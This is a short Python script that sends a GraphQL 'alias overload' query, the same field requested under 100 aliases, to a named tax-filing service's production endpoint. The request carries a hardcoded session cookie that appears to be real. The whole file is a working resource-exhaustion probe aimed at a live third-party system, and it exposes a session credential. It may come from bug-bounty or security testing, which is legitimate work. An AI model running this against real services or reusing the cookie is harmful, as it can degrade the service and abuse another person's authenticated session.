import requests

url = "https://cleartax.in/graphql"
headers = {
    "Cookie": "sid=4.c3de6548-b9ac-42f0-95f3-9f3fcf6c7ac9_6bf826366a8c195be67681808e70a1a9c15608e431088d5153c5e6ad6e7859b2; isloggedin=true",
    "Content-Type": "application/json",
    "Client": "newui"
}

# Batch 100 aliases of the same field
fields = " ".join([f"a{i}: isCopilotEnabled" for i in range(100)])
query = f"query AliasOverload {{ user {{ {fields} }} }}"

response = requests.post(url, json={"query": query}, headers=headers)
print(f"Status: {response.status_code}")
print(f"Response: {response.text[:500]}")
